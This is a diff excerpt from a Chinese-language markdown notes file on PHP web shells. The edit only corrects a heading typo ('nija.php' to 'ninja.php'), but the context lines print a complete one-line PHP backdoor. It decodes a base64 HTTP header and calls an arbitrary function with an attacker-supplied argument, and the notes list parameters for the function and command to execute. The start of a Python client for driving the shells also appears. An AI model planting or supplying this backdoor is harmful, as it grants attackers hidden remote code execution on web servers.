@@ -21,7 +21,7 @@ post数据存储到session解密后利用preg_replace()函数的漏洞
 - f 要执行的函数
 - c 要执行的命令
 
-## nija.php
+## ninja.php
 
 ```php
 <?php $h=getallheaders();$x=explode('~',base64_decode(substr($h['x'],1)));@$x[0]($x[1]);
@@ -35,7 +35,7 @@ post数据存储到session解密后利用preg_replace()函数的漏洞
 
 ![](assets/markdown-img-paste-20180530105351444.png)
 
-### nano.php nija.php 使用繁琐
+### nano.php ninja.php 使用繁琐
 
 ```python
 import requests
